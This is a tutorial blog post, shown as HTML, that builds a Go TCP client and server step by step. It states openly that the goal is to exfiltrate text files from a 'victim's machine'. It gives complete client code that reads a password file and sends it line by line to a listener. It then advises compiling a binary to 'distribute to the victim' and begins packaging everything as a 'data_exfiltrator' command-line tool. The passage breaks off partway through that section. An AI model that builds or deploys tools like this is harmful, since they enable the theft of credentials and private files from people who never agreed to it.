&lt;p&gt;When we run &lt;code&gt;net.Listen()&lt;/code&gt; we wish to listen on the network and when we run &lt;code&gt;net.Dial()&lt;/code&gt; we wish to dial the connection to some other program on a network. &lt;/p&gt;

&lt;p&gt;For server to server we use &lt;code&gt;net.Listen()&lt;/code&gt; &lt;br&gt;
for client to send data we use &lt;code&gt;net.Dial()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Right now to create a TCP server we will use &lt;code&gt;net.Listen()&lt;/code&gt;. Now the code will look like&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import (
    "fmt"
    "net"
)

const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
)

func main() {
    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)

    // starting a server
    conn, err := net.Listen(connType, connHost+":"+connPort)

    if err != nil {
        fmt.Println("Connection error", connHost+":"+connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // to continuously listen to connections
    fmt.Println("Listening ...")
    for {
        client, err := conn.Accept()
        if err != nil {
            panic(err.Error())
        }
        // To print the client address and port
        fmt.Println("Client", client.RemoteAddr().String(), "connected")

        // code here for accepting the traffic
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We start the server with &lt;code&gt;conn, err := net.Listen(connType, connHost+":"+connPort)&lt;/code&gt; and use &lt;code&gt;defer&lt;/code&gt; as best practice to safely close the connection. &lt;br&gt;
We run an infinite loop to listen to connections and use&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;client, err := conn.Accept()
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;to accept the connections. After this we will code what we need to do with the &lt;code&gt;client&lt;/code&gt; once a connection is accepted.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;func main() {
    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)

    // starting a server
    conn, err := net.Listen(connType, connHost+":"+connPort)

    if err != nil {
        fmt.Println("Connection error", connHost+":"+connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // to continuously listen to connections
    fmt.Println("Listening ...")
    for {
        client, err := conn.Accept()
        if err != nil {
            panic(err.Error())
        }
        // To print the client address and port
        fmt.Println("Client", client.RemoteAddr().String(), "connected")

        // code here for accepting the traffic
        buffer, err := bufio.NewReader(client).ReadBytes('\n')
        if err != nil {
            fmt.Println("Client left")
            client.Close()
            return
        }
        fmt.Println("Client message:", string(buffer[:]))

        // We close the client just after receiveing one message
        client.Close()
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We create a Reader using &lt;code&gt;bufio&lt;/code&gt; package. This will create a reader for us which will read bytes and delimit them at &lt;code&gt;\n&lt;/code&gt;. The message from the client is stored in the &lt;code&gt;buffer&lt;/code&gt; variable as bytes which we convert to string using &lt;code&gt;string(buffer[:])&lt;/code&gt;. &lt;br&gt;
To run and test this, open two terminals -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;# First terminal
$ go run server/server.go                                                                                                         
Starting tcp server on 127.0.0.1:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;On the second terminal&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nc localhost 8080
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and we will explain rest in the next section&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#using-raw-nc-endraw-or-raw-netcat-endraw-to-transfer-the-data"&gt;
  &lt;/a&gt;
  Using &lt;code&gt;nc&lt;/code&gt; or &lt;code&gt;netcat&lt;/code&gt; to transfer the data
&lt;/h3&gt;

&lt;p&gt;Once you run &lt;code&gt;nc&lt;/code&gt; command you will observe that our print statement is able to print out the connection details in the first terminal.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                         
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:40346 connected
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now in the second terminal we can just send the data by typing it&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nc localhost 8080
hello
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;When we press enter after typing &lt;code&gt;hello&lt;/code&gt; we can see the same appears over on the terminal one.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                         
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:40984 connected
Client message: hello
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You will see that your connection on the terminal gets immediately closed because we are running &lt;code&gt;client.Close()&lt;/code&gt; in the last line of the code. To make it more interactive we will now convert this code to accept connections and handle the connection on some go routines.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#creating-goroutine-to-handle-client-connections"&gt;
  &lt;/a&gt;
  Creating goroutine to handle client connections
&lt;/h3&gt;

&lt;p&gt;Every connection to the server will be handled in a goroutine. Its very simple to implement and we will create a special function to do that. The name of the function is &lt;code&gt;handleConnection()&lt;/code&gt; and this function will take the client connection as the parameter and perform the given tasks.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;func main() {
    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)

    // starting a server
    conn, err := net.Listen(connType, connHost+":"+connPort)

    if err != nil {
        fmt.Println("Connection error", connHost+":"+connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // to continuously listen to connections
    fmt.Println("Listening ...")
    for {
        client, err := conn.Accept()
        if err != nil {
            panic(err.Error())
        }
        // To print the client address and port
        fmt.Println("Client", client.RemoteAddr().String(), "connected")

        // code here for accepting the traffic
        go handleConnection(client)
    }
}

// Function to handle go routine after accepting client
func handleConnection(client net.Conn) {
    for {
        buffer, err := bufio.NewReader(client).ReadBytes('\n')
        if err != nil {
            fmt.Println("Client left")
            client.Close()
            return
        }
        fmt.Print("Client message:", string(buffer[:]))
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;Client Left&lt;/code&gt; statement is executed in the &lt;code&gt;handleConnection()&lt;/code&gt; function when &lt;code&gt;bufio&lt;/code&gt; reader is not able to read the incoming bytes and this will happen when the client has closed the connection from its side. Now the server will not close the connection immediately as the goroutine is running an infinite loop to receive messages continuously from the client. It will be the client's responsibility to close the connection now.&lt;br&gt;
Terminal 1 - Running the server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                         
Starting tcp server on 127.0.0.1:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Terminal 2 - Running the &lt;code&gt;nc&lt;/code&gt; client&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nc localhost 8080
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now we will continuously send the messages from &lt;code&gt;nc&lt;/code&gt; and we can see the same getting reflected in the terminal 1&lt;br&gt;
Terminal 2 - &lt;code&gt;nc&lt;/code&gt; (Type your message and press enter to send the message)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nc localhost 8080
hello
how
are
you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Terminal 1 - Your server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                    
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:55404 connected
Client message:hello
Client message:how
Client message:are
Client message:you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;When we terminate the &lt;code&gt;nc&lt;/code&gt; command using Ctrl+C then we get a message on server that client has left.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                    
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:55404 connected
Client message:hello
Client message:how
Client message:are
Client message:you
Client left
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now you don't need to restart server for another connection. Just simply create a &lt;code&gt;nc&lt;/code&gt; client and start sending the messages again.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                    
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:55404 connected
Client message:hello
Client message:how
Client message:are
Client message:you
Client left
Client 127.0.0.1:55832 connected
Client message:hello how are you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we see the client will get connected again through some different source port.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#create-a-client-that-sends-data-to-the-server"&gt;
  &lt;/a&gt;
  Create a client that sends data to the server
&lt;/h3&gt;

&lt;p&gt;Now we will remove the need of &lt;code&gt;nc&lt;/code&gt; and create our own client to achieve the same.&lt;br&gt;
For this create a directory called &lt;code&gt;client&lt;/code&gt; and create a file inside it called &lt;code&gt;client.go&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import (
    "bufio"
    "fmt"
    "os"
)

// there are server details to which client will connect
const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
)

func main() {
    reader := bufio.NewReader(os.Stdin)
    for {
        fmt.Print("Enter text: ")
        text, _ := reader.ReadString('\n')
        fmt.Printf("Your text is %s", text)
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We have server details that we will use soon to connect our client to the server. Right now we have created a reader that takes input from the &lt;code&gt;os.Stdin&lt;/code&gt; (your terminal) and prints them out in a continuous loop. You can run this program via &lt;code&gt;go run client/client.go&lt;/code&gt; to test if it works for you.&lt;br&gt;
Now we will modify the &lt;code&gt;main&lt;/code&gt; function to send &lt;code&gt;text&lt;/code&gt; to our server and we already discussed to use &lt;code&gt;net.Dial()&lt;/code&gt; for this. So our &lt;code&gt;main&lt;/code&gt; function will become&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

// there are server details to which client will connect
const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
)

func main() {

    // connecting to the server
    conn, err := net.Dial(connType, connHost+":"+connPort)
    if err != nil {
        fmt.Println("Not able to connect to ", connHost, "at port", connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // creating a reader
    reader := bufio.NewReader(os.Stdin)

    for {
        fmt.Print("Enter text: ")
        text, _ := reader.ReadString('\n')

        // Convert the text to bytes and then write the bytes for it send to the connection.
        conn.Write([]byte(text))
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We create a block to connect to server and create a reader for reading input from &lt;code&gt;stdin&lt;/code&gt; and then send it by using &lt;code&gt;conn.Write()&lt;/code&gt; function.&lt;br&gt;
To run this we will first run a server in terminal 1 and client in terminal 2.&lt;br&gt;
Terminal - 1&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go 
Starting tcp server on 127.0.0.1:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Terminal - 2&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go                                                                                                         
Enter text:
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Enter to send text&lt;br&gt;
Terminal - 2 (client)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go                                                                                                         
Enter text: hello
Enter text: how
Enter text: are
Enter text: you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Terminal - 1 (server)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go 
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:58480 connected
Client message:hello
Client message:how
Client message:are
Client message:you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#modify-the-client-to-read-the-file"&gt;
  &lt;/a&gt;
  Modify the client to read the file
&lt;/h3&gt;

&lt;p&gt;Our main purpose is to exfiltrate text file form the victim's machine to the remote machine, so logically our client should read input from text files rather then &lt;code&gt;os.Stdin&lt;/code&gt;.&lt;br&gt;
For this we will create a text file &lt;code&gt;sample_input.txt&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;password1
password2
password3
password4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Our directory structure looks like this&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ tree .
.
├── client
│   ├── client.go
│   └── sample_input.txt
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now our &lt;code&gt;client.go&lt;/code&gt; will be modified to read data from file &lt;code&gt;sample_input.txt&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

// there are server details to which client will connect
// we add here the file name to exfiltrate
const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
    fileName = "client/sample_input.txt"
)

func main() {

    // connecting to the server
    conn, err := net.Dial(connType, connHost+":"+connPort)
    if err != nil {
        fmt.Println("Not able to connect to ", connHost, "at port", connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // Open the file here
    file, err := os.Open(fileName)
    defer file.Close()
    if err != nil {
        fmt.Println("Not able to read file", fileName)
        panic(err.Error())
    }

    // Create a scanner to read the open file
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {

        // We add \n because scanner.Text() removes the ending newline character
        conn.Write([]byte(scanner.Text() + "\n"))

    }
    fmt.Println("File transferred successfully")
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We add the &lt;code&gt;const&lt;/code&gt; for file location &lt;code&gt;fileName&lt;/code&gt;. To open a file for reading we use the &lt;code&gt;os&lt;/code&gt; library and for reading the text from a file we use the &lt;code&gt;bufio&lt;/code&gt; scanner.&lt;br&gt;
The problem with the &lt;code&gt;Scanner&lt;/code&gt; is that it removes the newline after reading text from the file. That's why we need to add the newline at the end of the text that we are sending to the connection in &lt;code&gt;conn.Write()&lt;/code&gt; statement. Let's test this !&lt;br&gt;
Terminal -1 run your server normally as there are no changes&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                     
Starting tcp server on 127.0.0.1:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Running your &lt;code&gt;client.go&lt;/code&gt; file to send the data&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go
File transferred successfully
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If we see the output in the terminal 1, we will be surprised&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                     
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:34706 connected
Client message:password1
Client left
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We see that only the first line is being transferred to the server. But why? What happens to the remaining one ?&lt;/p&gt;

&lt;p&gt;The problem is because of the speed with which client is sending the data and the speed with which the server is ready to accept it. As the communication is asynchronous the client is never sure that the server has read the previous message. To make client run a bit slow we will add &lt;code&gt;time.Sleep()&lt;/code&gt; for client to sleep for 5 milliseconds.&lt;br&gt;
This is to be done in the &lt;code&gt;scanner.Scan()&lt;/code&gt; loop&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;...&amp;gt;
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {

        // We add \n because scanner.Text() removes the ending newline character
        conn.Write([]byte(scanner.Text() + "\n"))

        // sleeping for 5 milliseconds
        time.Sleep(5 * time.Millisecond)

    }
&amp;lt;...&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now running the &lt;code&gt;client.go&lt;/code&gt; in terminal 2&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go
File transferred successfully
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and server in terminal 1&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                     
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:35510 connected
Client message:password1
Client message:password2
Client message:password3
Client message:password4
Client left
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We are now able to see all the contents of the file. if this still is not giving you correct answer then try increasing the sleep time to 10, 20 or maybe even 50 milliseconds. But isn't this approach still asynchronous. The client is still unaware of whether the data has been read by the server or not. &lt;/p&gt;

&lt;p&gt;To make this a complete synchronized process we will ask the server to response a &lt;code&gt;yes&lt;/code&gt; or maybe anything as small as one character to declare that it has read the message and simultaneously ask the client to read (and send ) the next line only after receiving this confirmation.&lt;/p&gt;

&lt;p&gt;So to do this will modify the &lt;code&gt;server.go&lt;/code&gt; to write a response in the &lt;code&gt;handleConnection&lt;/code&gt; function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;func handleConnection(client net.Conn) {
    for {
        buffer, err := bufio.NewReader(client).ReadBytes('\n')
        if err != nil {
            fmt.Println("Client left")
            client.Close()
            return
        }
        fmt.Print("Client message:", string(buffer[:]))

        // send this as a response to the client
        client.Write([]byte("Y"))
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and in the &lt;code&gt;client.go&lt;/code&gt; to read the response we will modify the for loop of &lt;code&gt;scanner.Scan&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;    scanner := bufio.NewScanner(file)
    for scanner.Scan() {

        // We add \n because scanner.Text() removes the ending newline character
        conn.Write([]byte(scanner.Text() + "\n"))

        // declare a byte variable
        var b = make([]byte, 2, 3)

        // read the response here
        conn.Read(b)

    }
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We declare a variable and read the response in that variable. Once this is done we will begin reading next line.&lt;/p&gt;

&lt;p&gt;Running this from terminal - 2 for client&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go
File transferred successfully
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;From terminal - 1 for server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                     
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:36584 connected
Client message:password1
Client message:password2
Client message:password3
Client message:password4
Client left
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now our entire process is synchronous.&lt;/p&gt;

&lt;p&gt;Now if you want you can stop here and modify the host and port to make it workable for your needs. Launch the server in your local and run the client program on the victim machine. Obviously there are high chances that you might not be able to run the go program in the victim machine directly using the &lt;code&gt;go&lt;/code&gt; command so you need to convert it into an executable. For this you can run the following command -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cd client

$ go build client.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will create a binary that you can distribute to the victim and transfer the text files from there.&lt;/p&gt;

&lt;p&gt;If you want to transform the entire thing into a complete tool then follow along to see how we convert server and client to a single application and use arguments for host, port and file paths.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#using-cobra-for-cli-modifications"&gt;
  &lt;/a&gt;
  Using cobra for CLI modifications.
&lt;/h3&gt;

&lt;p&gt;Before diving into this our purpose in this sub-section is to create a tool which run server like this&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;./data_exfiltrator server --host 192.168.56.1 --port 8080 -o output.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and for the client to exfiltrate &lt;code&gt;password.txt&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;./data_exfiltrator client --host 192.168.56.1 --port 8080 -f password.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For this we will use &lt;code&gt;cobra&lt;/code&gt; which is used by lot of open-source projects like &lt;code&gt;kubernetes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For getting started this is our current folder&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ pwd
~/data_exfiltrator
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and the directory structure is&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ tree .
.
├── client
│   ├── client.go
│   └── sample_input.txt
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;First we need to create a module which we can done by running&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go mod init example.com/data_exfiltrator
go: creating new go.mod: module example.com/data_exfiltrator
go: to add module requirements and sums:
    go mod tidy

# It will create a go.mod file                                                                                                                                        
$ ls -lrt           
total 12
drwxr-xr-x 2 kai kai 4096 Jan 21 23:51 server
drwxr-xr-x 2 kai kai 4096 Jan 23 21:29 client
-rw-r--r-- 1 kai kai   45 Jan 23 21:31 go.mod
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To install cobra we need to install its module. Preferably run this from &lt;code&gt;~/data_exfiltrator&lt;/code&gt; directory.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go get -u github.com/spf13/cobra
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will install the module dependency in the &lt;code&gt;go.mod&lt;/code&gt; file and &lt;code&gt;go.sum&lt;/code&gt; file for checksums&lt;/p&gt;

&lt;p&gt;Now we need to set out our &lt;code&gt;PATH&lt;/code&gt; variable to take binaries inside the path &lt;code&gt;GOBIN&lt;/code&gt; as well . To get the &lt;code&gt;GOBIN&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go env  | grep GOBIN                                                                                                          
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If the &lt;code&gt;GOBIN&lt;/code&gt; is empty for you search for &lt;code&gt;GOPATH/bin&lt;/code&gt; and add this to your path variable.&lt;br&gt;
To check this run&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cobra help
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If this runs successfully then cobra is rightly installed.&lt;/p&gt;

&lt;p&gt;Now we will use cobra to initialize our client APP. The command to do that is&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cobra init
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will initialize your application and you will see lot of files created.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ tree .
.
├── client
│   ├── client.go
│   └── sample_input.txt
├── cmd
│   └── root.go
├── go.mod
├── go.sum
├── LICENSE
├── main.go
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Firstly, &lt;code&gt;cobra&lt;/code&gt; creates &lt;code&gt;main.go&lt;/code&gt; from where our application will begin. Secondly, it creates &lt;code&gt;cmd&lt;/code&gt; file which contains &lt;code&gt;root.go&lt;/code&gt;. This is the file which will be executed from &lt;code&gt;main.go&lt;/code&gt; and will contain what we need to do when we run &lt;code&gt;main.go&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We wish to add sub-commands like &lt;code&gt;client&lt;/code&gt; and &lt;code&gt;server&lt;/code&gt; as described earlier. For this we can run&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cobra add client

$ cobra add server
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will modify the &lt;code&gt;cmd&lt;/code&gt; directory to add two more files named &lt;code&gt;client.go&lt;/code&gt; and &lt;code&gt;server.go&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ tree .
.
├── client
│   ├── client.go
│   └── sample_input.txt
├── cmd
│   ├── client.go
│   ├── root.go
│   └── server.go
├── go.mod
├── go.sum
├── LICENSE
├── main.go
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Our server and client files reside in &lt;code&gt;server/server.go&lt;/code&gt; and &lt;code&gt;client/client.go&lt;/code&gt; which are different from the &lt;code&gt;server.go&lt;/code&gt; and &lt;code&gt;client.go&lt;/code&gt; created by &lt;code&gt;cobra&lt;/code&gt; in &lt;code&gt;cmd&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;When we will run &lt;code&gt;go run main.go client&lt;/code&gt; then the &lt;code&gt;cmd/client.go&lt;/code&gt; will be invoked and when we will execute &lt;code&gt;go run main.go server&lt;/code&gt; then the &lt;code&gt;cmd/server.go&lt;/code&gt; will be invoked.&lt;/p&gt;

&lt;p&gt;Right now if we observe our &lt;code&gt;client/client.go&lt;/code&gt; and &lt;code&gt;server/server.go&lt;/code&gt; are part of &lt;code&gt;main&lt;/code&gt; package. We can't use &lt;code&gt;main&lt;/code&gt; as package for them because we don't want to create separate binaries for them, so we will convert &lt;code&gt;client/client.go&lt;/code&gt; to become package &lt;code&gt;client&lt;/code&gt; and for &lt;code&gt;server/server.go&lt;/code&gt; we will use package name &lt;code&gt;server&lt;/code&gt;. To do this just simply change their package names from &lt;code&gt;main&lt;/code&gt; to &lt;code&gt;client&lt;/code&gt; or &lt;code&gt;server&lt;/code&gt; accordingly.&lt;/p&gt;

&lt;p&gt;Now as we are running these file separately so we will remove the &lt;code&gt;main&lt;/code&gt; function and create different functions for them.&lt;br&gt;
For &lt;code&gt;client/client.go&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

